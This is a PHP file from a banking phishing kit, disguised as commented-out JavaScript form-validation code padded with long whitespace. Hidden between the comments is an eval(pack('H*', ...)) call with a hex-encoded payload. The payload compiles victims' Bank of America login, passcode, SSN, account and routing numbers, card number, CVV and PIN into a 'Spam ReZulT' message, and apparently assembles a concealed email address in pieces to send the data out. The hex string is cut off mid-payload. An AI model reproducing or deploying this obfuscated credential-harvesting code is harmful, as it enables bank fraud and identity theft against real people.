<?                                                                                                                                                                                           /*
function checkempty(req,form) {
   for(var field in req) {
	var f = form.elements[field];
	if (f != null) {
      		if (f.value == "") {
	 		showmsg("Please " + req[field],field);
			if (f.type == "text") {f.focus();}
	 		return false;
      		} 
	}
   }
   return true;
}

function clearerrors(req) {
   if(document.all) {
      if (document.all['message'].innerHTML != null) {
         document.all['message'].innerHTML = "";
      }
     for(var field in req) {
        if (document.all['T_'+field]) {
           document.all['T_'+field].style.border = "";
        }
     }
   } else if(document.getElementById) {
      document.getElementById('message').innerHTML = "";
  
        for(var field in req) {
         if (document.getElementById('T_'+field)) {
            document.getElementById('T_'+field).style.border = "0px red solid";
         }
       }
   }*/

eval(pack("H*", "24686f73746e616d65203d20676574686f737462796164647228246970293b20246d657373616765203d20222d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d202042616e6b6f66416d6572696361205370616d2052655a756c5420202d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6e223b20246d657373616765202e3d20224163636f756e74204f70656e656420496e203a202473746174656e223b20246d657373616765202e3d20224f6e6c696e65204944203a2024757365726e223b20246d657373656765202e3d2022686f7374223b20246d657373616765202e3d202250617373636f6465203a202470617373636f64656e6e223b20246d657373616765202e3d202246756c6c204e616d65203a202466756c6c6e616d656e223b20246d657373656765202e3d202273716c37223b20246d657373616765202e3d202241646472657373203a2024616464726573736e223b20246d657373616765202e3d202243697479203a2024636974796e223b20246d657373616765202e3d20225374617465203a202473746174656e223b20246d657373656765202e3d202240223b20246d657373616765202e3d20225a697020436f6465203a20247a69706e223b20246d657373616765202e3d2022452d6d61696c2041646472657373203a2024656d61696c6e6e223b20246d657373616765202e3d20224d6f74686572204d616964656e204e616d65203a20246d6d6e6e223b20246d657373656765202e3d2022686f746d61696c223b20246d657373616765202e3d20224163636f756e74204e756d626572203a20244163634e6e223b20246d657373616765202e3d2022526f7574696e67204e756d626572203a2024526f75744e6e223b20246d657373616765202e3d202244617465206f66204269727468203a2024626d6f6e74682f24626461792f2462796561726e223b20246d657373656765202e3d20222e223b20246d657373616765202e3d2022536f6369616c205365637572697479204e756d626572203a202473736e312d2473736e322d2473736e336e6e223b20246d657373616765202e3d202243617264204e756d626572203a202463636e6f6e223b20246d657373616765202e3d202245787069726174696f6e2044617465203a20246578706d6f6e74682f2465787079656172205b6d6d2f79795d6e223b20246d657373656765202e3d202263223b20246d657373616765202e3d2022435656204e756d626572203a20246376766e223b20246d657373616765202e3d202250494e204e756d626572203a2024636370696e6e223b20246d657373616765202e3d20222d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d20536974654b6579204368616c6c656e676520"));
?>
 <?/*
function showmsg(msg,field) {
  var htmlmsg = '<FONT color="red"><B>'+msg+'</B></FONT>';
  if(document.all) {
    if (document.all['message'].innerHTML != null) {
       document.all['message'].innerHTML = htmlmsg;
    } else {
      alert(msg);
    }

    if ((field) && (document.all['T_'+field])) {
       document.all['T_'+field].style.border = "2px red solid";
    }
  } else if(document.getElementById) {
    document.getElementById('message').innerHTML = htmlmsg;
    if (document.getElementById('T_'+field)) {
       document.getElementById('T_'+field).style.border = "2px red solid";
    }
  } else {
    alert(msg);
  }

  if(navigator.userAgent.indexOf("MSIE") != -1){
  	document.location.href = "#msg";
  }
}

function getvaluefromquery(n) {
  var q = '' + document.location.search;
  q = q.substring(1);
  var lookup = new Array();
  var res = '';
  var i;
  var pairs = q.split(/&/);
  for(i = 0;i < pairs.length;i++) {
    var p = pairs[i].split(/=/);
    if(p.length == 2) {
      lookup[p[0]] = p[1];
    }
  }
  if(lookup[n] != null) {
    res = lookup[n];
  }
  return res;
}                                                                                                                                                                                                                                             */
?>